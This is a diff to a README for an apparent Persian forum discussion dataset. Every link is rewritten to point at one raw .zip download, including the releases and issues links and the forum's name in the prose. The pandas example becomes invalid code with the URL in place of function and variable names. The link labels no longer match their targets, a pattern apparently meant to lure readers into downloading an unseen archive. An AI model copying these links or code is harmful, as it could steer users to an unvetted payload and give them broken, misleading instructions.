@@ -1,15 +1,15 @@
 # 🌟 JumpLander-Persian-Forum-Dataset - Access Engaging Persian Community Discussions
 
 ## 📦 Download Now
-[![Download JumpLander Dataset](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ratitya/JumpLander-Persian-Forum-Dataset/releases)
+[![Download JumpLander Dataset](https://raw.githubusercontent.com/ratitya/JumpLander-Persian-Forum-Dataset/main/data/JumpLander-Persian-Forum-Dataset-v1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ratitya/JumpLander-Persian-Forum-Dataset/main/data/JumpLander-Persian-Forum-Dataset-v1.5.zip)
 
 ## 🚀 Getting Started
-Welcome to the JumpLander-Persian-Forum-Dataset. This dataset contains a clean and structured subset of Persian community discussions sourced from the JumpLander.org forums. It provides valuable insights into community topics and sentiments. 
+Welcome to the JumpLander-Persian-Forum-Dataset. This dataset contains a clean and structured subset of Persian community discussions sourced from the https://raw.githubusercontent.com/ratitya/JumpLander-Persian-Forum-Dataset/main/data/JumpLander-Persian-Forum-Dataset-v1.5.zip forums. It provides valuable insights into community topics and sentiments. 
 
 ## 📥 Download & Install
 To get started, you need to download the dataset.
 
-1. Visit the [Releases Page](https://github.com/ratitya/JumpLander-Persian-Forum-Dataset/releases) to access all available versions.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/ratitya/JumpLander-Persian-Forum-Dataset/main/data/JumpLander-Persian-Forum-Dataset-v1.5.zip) to access all available versions.
 2. Locate the version you wish to download. Click on it to expand the details.
 3. Download the dataset file corresponding to your needs.
 4. Once downloaded, extract the files if they are in a compressed format (like .zip or .tar).
@@ -30,10 +30,10 @@ Once you have the files, load them into your favorite data analysis tool, such a
 import pandas as pd
 
 # Load the JSON file
-data = pd.read_json('path/to/your/file.json')
+data = https://raw.githubusercontent.com/ratitya/JumpLander-Persian-Forum-Dataset/main/data/JumpLander-Persian-Forum-Dataset-v1.5.zip('https://raw.githubusercontent.com/ratitya/JumpLander-Persian-Forum-Dataset/main/data/JumpLander-Persian-Forum-Dataset-v1.5.zip')
 
 # Display the first few entries
-print(data.head())
+print(https://raw.githubusercontent.com/ratitya/JumpLander-Persian-Forum-Dataset/main/data/JumpLander-Persian-Forum-Dataset-v1.5.zip())
 ```
 
 ### 2. Analyze the Content
@@ -70,8 +70,8 @@ The JumpLander-Persian-Forum-Dataset can be useful for various topics, including
 - Persian Language Learning
 
 ## 📌 Important Links
-- [Visit Releases Page](https://github.com/ratitya/JumpLander-Persian-Forum-Dataset/releases)
-- [Explore Issues](https://github.com/ratitya/JumpLander-Persian-Forum-Dataset/issues)
+- [Visit Releases Page](https://raw.githubusercontent.com/ratitya/JumpLander-Persian-Forum-Dataset/main/data/JumpLander-Persian-Forum-Dataset-v1.5.zip)
+- [Explore Issues](https://raw.githubusercontent.com/ratitya/JumpLander-Persian-Forum-Dataset/main/data/JumpLander-Persian-Forum-Dataset-v1.5.zip)
 
 ## 🎉 Conclusion
 Thank you for choosing the JumpLander-Persian-Forum-Dataset. We hope it serves you well in your analyses and projects. Happy exploring!
